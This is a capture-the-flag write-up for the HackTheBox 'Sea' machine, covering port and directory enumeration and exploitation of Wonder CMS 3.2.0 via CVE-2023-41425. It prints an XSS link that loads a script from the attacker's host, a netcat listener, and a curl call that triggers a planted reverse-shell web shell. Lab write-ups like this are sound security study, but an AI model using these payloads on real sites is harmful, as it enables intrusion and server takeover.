# Sea HTB Write-Up

**Difficulty:** Easy  
**IP Address:** 10.10.11.28

## Enumeration

We'll begin by scanning the target IP address, `10.10.11.28`, to identify open ports and services running on the SEa box.
## Enumeration

As usual, I'll start by using `rustscan` in combination with `nmap` to quickly identify open ports and gather detailed service information.

### Rustscan Command
```bash
rustscan -a -t 2000 10.10.11.20 -- -sC -sV -oN nmap -Pn
```

### Initial Results

Right off the bat, `rustscan` picked up **Port 22 (SSH)** and **Port 80 (HTTP)**. While the scan was still doing its thing, I decided to jump into my browser and punch in the IP address `10.10.11.28`.

### Web Exploration

Boom! I'm greeted by a pretty slick biking site. Unlike other HTB boxes, I didn't even have to mess with my `/etc/hosts` file to add `sea.htb`—it just worked straight up.
### Digging Deeper

I fired up Burp Suite because, well, why not? By the time I got that going, `nmap` had finished its scan, and it didn't find any extra ports.

### Nmap Results

Here's what `nmap` showed:

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-title: Editorial Tiempo Arriba
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

So, just **Port 22 (SSH)** and **Port 80 (HTTP)** running `nginx`. The site title showed as *Editorial Tiempo Arriba*, which matches the biking theme I saw earlier.

```


So, just **Port 22 (SSH)** and **Port 80 (HTTP)** running `nginx`. The site title showed as *Editorial Tiempo Arriba*, which matches the biking theme I saw earlier.

i also started an active spider on burpsuite just in case
### Exploring the Website

While browsing around the site, I found a "How to Participate" page. This page had a link that led me to `sea.htb/contact.php`.

### Hosts File Update

So, it turns out I did need to add `sea.htb` to my `/etc/hosts` file after all.


### Visiting `contact.php`

When I hit up `sea.htb/contact.php`, I was greeted by a contact form. I'm not really a fan of testing forms unless I'm out of options, so I decided to switch things up.

### Directory Scanning

I fired up a directory scan using `dirsearch`—trying something new this time.

```bash
dirsearch -u http://sea.htb

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                      
 (_||| _) (/_(_|| (_| )                                                                                                                                               
                                                                                                                                                                      
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/mofe/reports/http_sea.htb/__24-08-13_09-41-38.txt

Target: http://sea.htb/

[09:41:38] Starting:                                                                                                                                                  
[09:41:43] 403 -  199B  - /%3f/                                             
[09:41:48] 403 -  199B  - /.ht_wsr.txt                                      
[09:41:48] 403 -  199B  - /.htaccess.orig                                   
[09:41:48] 403 -  199B  - /.htaccess.sample                                 
[09:41:48] 403 -  199B  - /.htaccess.bak1                                   
[09:41:48] 403 -  199B  - /.htaccess.save                                   
[09:41:48] 403 -  199B  - /.htaccess_extra                                  
[09:41:48] 403 -  199B  - /.htaccess_sc
[09:41:48] 403 -  199B  - /.htaccessBAK
[09:41:48] 403 -  199B  - /.htaccessOLD2
[09:41:48] 403 -  199B  - /.html
[09:41:48] 403 -  199B  - /.httr-oauth                                      
[09:41:48] 403 -  199B  - /.htpasswds
[09:41:48] 403 -  199B  - /.htpasswd_test
[09:41:48] 403 -  199B  - /.htaccess_orig                                   
[09:41:48] 403 -  199B  - /.htaccessOLD                                     
[09:41:48] 403 -  199B  - /.htm
[09:41:50] 403 -  199B  - /.php                                             
[09:41:55] 200 -    1KB - /404                                              
[09:42:01] 403 -  199B  - /admin%20/                                        
[09:42:25] 200 -  939B  - /contact.php                                      
[09:42:28] 301 -  228B  - /data  ->  http://sea.htb/data/                   
[09:42:28] 403 -  199B  - /data/                                            
[09:42:28] 403 -  199B  - /data/files/                                      
[09:42:47] 403 -  199B  - /login.wdm%20                                     
[09:42:51] 301 -  232B  - /messages  ->  http://sea.htb/messages/           
[09:42:56] 403 -  199B  - /New%20Folder                                     
[09:42:56] 403 -  199B  - /New%20folder%20(2)                               
[09:43:00] 403 -  199B  - /phpliteadmin%202.php                             
[09:43:04] 301 -  231B  - /plugins  ->  http://sea.htb/plugins/             
[09:43:04] 403 -  199B  - /plugins/
[09:43:07] 403 -  199B  - /Read%20Me.txt                                    
[09:43:11] 403 -  199B  - /server-status                                    
[09:43:11] 403 -  199B  - /server-status/
[09:43:22] 301 -  230B  - /themes  ->  http://sea.htb/themes/               
[09:43:22] 403 -  199B  - /themes/
                                                                             
Task Completed  
```
### Dirsearch Results


The directory scan with `dirsearch` wrapped up, and here’s what I found:

- **403 Forbidden** on several `.htaccess` and other sensitive files (e.g., `/admin%20/`, `/data/`, `/plugins/`, etc.).
- **200 OK** on `/contact.php` (which I already knew about) and `/404`.
- **301 Redirects** for `/data`, `/messages`, `/plugins`, and `/themes`, but they all returned 403s.

Not too much to go on yet, but these 403s might hide something interesting.
### False Positives from `/home`

While poking around, I realized that the site returns the homepage for any URL ending with `/home`. This made recursive directory busting a bit messy, as it led to a bunch of false positives. For example, even something like:

```plaintext
http://sea.htb/no-fricking-way/home
```
Would just bring up the homepage again, which isn’t helpful at all.
### Sorting Through DirBuster Results

After sifting through the results from OWASP DirBuster, I sorted them by HTTP status code 200 to filter out the relevant paths. This revealed a few interesting ones:

- **/Version**: This might provide some details about the site’s version.
- **/README.md**: Often a README file can contain useful information or hints.

I’ll take a closer look at these paths to see what useful information they might hold.

From the `/themes/bike/README.md` file, I discovered that the site is running **Wonder CMS** with a **Bike theme**.

### Version Information

I checked out the `/themes/bike/version` page and found a single line of text revealing the version number: 3.2.0

### Vulnerability Identification

For Wonder CMS version 3.2.0, I found a relevant vulnerability:

- **CVE-2023-41425**: This is a Cross-Site Scripting (XSS) vulnerability affecting Wonder CMS versions from 3.2.0 to 3.4.2. It allows a remote attacker to execute arbitrary code by uploading a crafted script to the `installModule` component.





### Exploiting the Web Shell

After running the exploit, I was prompted with the usage instructions:

```bash
python exploit.py                                  
usage: python3 exploit.py loginURL IP_Address Port
example: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252
```
I set up my listener and tried the exploit again with the necessary information. The exploit created a web shell and provided the following details:
````
python exploit.py http://sea.htb/loginURL 10.10.14.18 4444 
[+] xss.js is created
[+] execute the below command in another terminal

----------------------------
nc -lvp 4444
----------------------------

send the below link to admin:

----------------------------
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.18:8000/xss.js"></script><form+action="
----------------------------

starting HTTP server to allow the access to xss.js
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
````
Since the method in the exploit was complex, I opted to use curl to access the web shell directly. The web shell location was stated in the code:
````
curl "http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.18&lport=4444"
````
the commond worked and i got a reverse shell
![2024-08-13_13-15](https://github.com/user-attachments/assets/b9a8ab01-6126-484a-9e74-b4d3addba8ad)

### Privilege Escalation

After obtaining a shell as `www-data`, I upgraded my shell for better interaction. My first step was to explore the web directories for sensitive information that could assist with privilege escalation.

From the shell at `www-data@sea:/var/www/sea$`, I navigated to the `/data` directory and discovered a `database.js` file. This file contained a hash that could be useful.

Here's a screenshot of the hash found in `database.js`:







